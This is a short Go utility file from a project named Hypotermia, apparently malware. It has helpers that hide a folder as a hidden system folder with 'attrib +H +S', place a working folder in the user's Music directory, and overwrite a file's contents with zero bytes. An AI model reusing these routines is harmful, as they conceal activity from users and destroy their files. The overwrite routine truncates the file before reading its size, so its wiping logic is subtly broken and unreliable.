package utils

import (
	"os"
	"os/exec"
	"path/filepath"

	"Hypotermia/config"
)

func HideFolder(path string) error {
	cmd := exec.Command("attrib", "+H", "+S", path)
	err := cmd.Run()

	if err != nil {
		return err
	}

	return nil
}

func GetMainFolder() string {
	return filepath.Join(os.Getenv("USERPROFILE"), "Music", config.HypotermiaName+"-"+config.Identifier)
}

func OverwriteFile(path string) error {
	file, err := os.OpenFile(path, os.O_RDWR|os.O_TRUNC, 0666)
	if err != nil {
		return err
	}

	defer file.Close()

	stat, err := file.Stat()
	if err != nil {
		return err
	}

	_, err = file.Write(make([]byte, stat.Size()))
	if err != nil {
		return err
	}

	return nil
}
